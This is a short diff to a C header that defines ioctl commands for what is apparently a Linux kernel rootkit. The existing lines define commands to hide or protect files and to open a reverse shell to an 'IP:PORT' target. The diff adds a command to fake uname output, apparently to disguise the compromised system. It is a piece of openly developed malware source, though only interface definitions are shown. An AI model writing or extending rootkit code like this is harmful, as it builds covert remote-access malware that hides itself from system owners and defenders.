@@ -92,6 +92,9 @@ struct rk_args {
 #define RK_CMD_PROTECT_FILE      _IOW (RK_MAGIC, 12, struct rk_args)
 #define RK_CMD_UNPROTECT_FILE    _IOW (RK_MAGIC, 13, struct rk_args)
 #define RK_CMD_REVERSE_SHELL     _IOW (RK_MAGIC, 14, struct rk_args)
+#define RK_CMD_FAKE_UNAME        _IOW (RK_MAGIC, 15, struct rk_args)
+
+#define RK_UNAME_MAX 65  /* __NEW_UTS_LEN + 1 */
 
 /* Reverse shell argument: target holds pointer to "IP:PORT" string */
 #define RK_REVSHELL_MAX 64
